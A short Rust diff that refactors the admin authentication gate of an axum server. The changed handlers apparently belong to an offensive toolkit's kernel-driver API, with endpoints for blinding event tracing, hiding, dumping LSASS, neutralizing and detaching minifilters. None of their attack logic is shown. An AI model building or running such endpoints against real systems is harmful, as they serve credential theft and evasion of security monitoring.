@@ -84,15 +84,15 @@ impl KernelBridge {
 fn gate(
     st: &crate::AppState,
     headers: &HeaderMap,
-) -> Result<operators::OperatorIdentity, Response> {
+) -> Result<operators::OperatorIdentity, (axum::http::StatusCode, &'static str)> {
     match crate::authenticate(st, headers) {
         crate::AuthOutcome::Allowed(op) => {
             if op.role != operators::Role::Admin {
-                return Err((axum::http::StatusCode::FORBIDDEN, "admin required").into_response());
+                return Err((axum::http::StatusCode::FORBIDDEN, "admin required"));
             }
             Ok(op)
         }
-        crate::AuthOutcome::Denied(r) => Err(r),
+        crate::AuthOutcome::Denied(_) => Err((axum::http::StatusCode::UNAUTHORIZED, "auth required")),
     }
 }
 
@@ -115,7 +115,7 @@ pub async fn driver_status(
 ) -> Response {
     let _ = match gate(&st, &headers) {
         Ok(o) => o,
-        Err(r) => return r,
+        Err((code, msg)) => return (code, msg).into_response(),
     };
     let bridge = match &st.kernel {
         Some(b) => b,
@@ -136,7 +136,7 @@ pub async fn blind_etw(
 ) -> Response {
     let _ = match gate(&st, &headers) {
         Ok(o) => o,
-        Err(r) => return r,
+        Err((code, msg)) => return (code, msg).into_response(),
     };
     let bridge = match &st.kernel {
         Some(b) => b,
@@ -155,7 +155,7 @@ pub async fn hide(
 ) -> Response {
     let _ = match gate(&st, &headers) {
         Ok(o) => o,
-        Err(r) => return r,
+        Err((code, msg)) => return (code, msg).into_response(),
     };
     let bridge = match &st.kernel {
         Some(b) => b,
@@ -174,7 +174,7 @@ pub async fn dump_lsass(
 ) -> Response {
     let _ = match gate(&st, &headers) {
         Ok(o) => o,
-        Err(r) => return r,
+        Err((code, msg)) => return (code, msg).into_response(),
     };
     let bridge = match &st.kernel {
         Some(b) => b,
@@ -193,7 +193,7 @@ pub async fn neutralize(
 ) -> Response {
     let _ = match gate(&st, &headers) {
         Ok(o) => o,
-        Err(r) => return r,
+        Err((code, msg)) => return (code, msg).into_response(),
     };
     let bridge = match &st.kernel {
         Some(b) => b,
@@ -211,7 +211,7 @@ pub async fn detach_minifilter(
 ) -> Response {
     let _ = match gate(&st, &headers) {
         Ok(o) => o,
-        Err(r) => return r,
+        Err((code, msg)) => return (code, msg).into_response(),
     };
     let bridge = match &st.kernel {
         Some(b) => b,
